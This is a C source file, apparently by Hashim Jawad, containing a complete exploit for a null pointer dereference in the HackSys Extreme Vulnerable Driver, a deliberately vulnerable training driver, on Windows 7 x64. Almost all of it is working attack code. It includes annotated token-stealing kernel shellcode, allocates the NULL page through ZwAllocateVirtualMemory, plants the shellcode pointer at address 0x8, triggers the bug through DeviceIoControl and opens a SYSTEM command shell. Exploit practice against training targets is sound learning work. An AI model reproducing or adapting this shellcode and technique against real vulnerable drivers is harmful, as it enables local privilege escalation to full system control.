// Exploit    : HackSys Extreme Vulnerable Driver - Null Pointer Dereference 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 7 Enterprise (x64) SP1

#include <stdio.h>
#include <windows.h>

int main() {

	wchar_t* deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";        // make sure the character set is set to Unicode under project defaults
	const DWORD iocontrolCode = 0x22202B;                                  // found using Ghidra
	DWORD outputBuffer = 0;
	DWORD bytesReturned = 0;
	BOOL ioResult;

	// Token stealing shellcode
	BYTE shellCode[] = {
		//0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,     // breakpoint
		//0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // nop cushion 
		0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; zero out rax
		0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,       // mov rax,QWORD PTR gs:[rax+0x188] ; move current thread (KTHREAD) into rax (KPCR + 0x180(KPRCB) + 0x8(KTHREAD))
		0x48, 0x8B, 0x40, 0x70,                               // mov rax,QWORD PTR [rax+0x70]     ; move current EPROCESS to rax (KTHREAD + 0x50(KAPC_STATE) + 0x20(EPROCESS))
		0x48, 0x89, 0xC1,                                     // mov rcx, rax                     ; make copy of the current process's EPROCESS
		0x49, 0x89, 0xCB,                                     // mov r11,rcx                      ; store RefCnt from token (EX_FAST_REF) structure
		0x49, 0x83, 0xE3, 0x07,                               // and r11,0x7
		0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00,             // mov rdx,0x4                      ; move SYSTEM PID to rdx
		0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,             // mov rax,QWORD PTR [rax+0x188]    ; fetch ActiveProcessLinks doubly-linked list (EPROCESS+0x188)
		0x48, 0x2D, 0x88, 0x01, 0x00, 0x00,                   // sub rax, 0x188                   ; loop thru the list processes and extract UniqueProcessId (EPROCESS+0x180)
		0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,             // cmp QWORD PTR [rax+0x180],rdx    ; until you find SYSTEM PID of 4
		0x75, 0xEA,                                           // jne $-0x14+(0x2)
		0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00,             // mov rdx,QWORD PTR [rax+0x208]    ; grab SYSTEM's process EPROCESS token
		0x48, 0x83, 0xE2, 0xF0,                               // and rdx, 0x0fffffffffffffff0
		0x4C, 0x09, 0xDA,                                     // or rdx,r11
		0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00,             // mov QWORD PTR [rcx+0x208],rdx    ; replace the current EPROCESS's token
		0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; simulate NTSTATUS SUCCESS! 
		//0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28                    ; recover Kernel stuff
		0xC3,                                                 // ret
	};

	// Create driver handle
	HANDLE hevdDriver = CreateFile(deviceName,             // lpFileName
		GENERIC_READ | GENERIC_WRITE,                  // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,            // dwShareMode
		NULL,                                          // lpSecurityAttributes
		OPEN_EXISTING,                                 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,                         // dwFlagsAndAttributes
		NULL                                           // hTemplateFile
	);

	if (hevdDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to grab device handle with error code: %u\n", GetLastError());
		exit(-1);
	}

	printf("[+] Driver handle snatched at: %p\n", hevdDriver);

	// Allocate memory for shellcode
	LPVOID shellcodeAddress = VirtualAlloc(NULL,            // lpAddress
		sizeof(shellCode),                              // dwSize
		MEM_COMMIT | MEM_RESERVE,                       // flAllocationType
		PAGE_EXECUTE_READWRITE                          // flProtect
	);

	if (!shellcodeAddress) {
		printf("[!] Failed to allocate memory for shellcode with error code: %u\n", GetLastError());
		exit(-1);
	}

	printf("[+] Shellcode memory has been allocated at: 0x%p\n", shellcodeAddress);

	// Copy token stealing shellcode to user space memory
	memcpy(shellcodeAddress,                                // Dst
		shellCode,                                      // Src
		sizeof(shellCode)                               // size of Src
	);

	printf("[+] Copying shellcode to RWX allocated memory\n");

	
	// Get a pointer to the internal ZwAllocateVirtualMemory call
	typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
		_In_    HANDLE    ProcessHandle,
		_Inout_ PVOID     *BaseAddress,
		_In_    ULONG_PTR ZeroBits,
		_Inout_ PSIZE_T   RegionSize,
		_In_    ULONG     AllocationType,
		_In_    ULONG     Protect
		);

	// Retrieving ZwAllocateVirtualMemory handle
	ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");

	// Allocating NULL page
	// reference http://www.rohitab.com/discuss/topic/34884-c-small-hax-to-avoid-crashing-ur-prog/
	PVOID memAddr = (PVOID)1;
	SIZE_T regionSize = 1024;

	NTSTATUS nullPage = _ZwAllocateVirtualMemory(
		GetCurrentProcess(),
		&memAddr, //A pointer to a variable that will receive the base address of the allocated region of pages. If the initial value of this parameter is non-NULL, the region is allocated starting at the specified virtual address rounded down to the next host page size address boundary. If the initial value of this parameter is NULL, the operating system will determine where to allocate the region.
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	printf("[+] Successfully allocated NULL page in user space\n");

	// Set the Callback() address at offset/address 0x8 (x64) to the token stealing shellcode
	*(ULONG_PTR*)0x8 = (ULONG_PTR)shellcodeAddress;

	printf("[+] Copying shellcode pointer to allocated page + 0x8\n");

	// Set dummy buffer as an input for DeviceIoControl
	char exploit[1024];
	memset(exploit, 'A', sizeof(exploit));

	ioResult = DeviceIoControl(hevdDriver,                  // hDevice
		iocontrolCode,                                  // dwIoControlCode
		exploit,	                                // lpInBuffer
		sizeof(exploit),	                        // nInBufferSize
		&outputBuffer,                                  // lpOutBuffer
		0,                                              // nOutBufferSize
		&bytesReturned,                                 // lpBytesReturned
		NULL                                            // lpOverlapped
	);

	if (ioResult == FALSE) {
		fprintf(stderr, "[!] Failed to call target driver with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] Device call was successful\n");

	// Spawn new cmd.exe as NT AUTHORITY\SYSTEM
	printf("[+] Enjoy your new SYSTEM shell!\n");
	system("cmd.exe");

	// Cleanup code
	if (hevdDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(hevdDriver);
	}

	return 0;
}
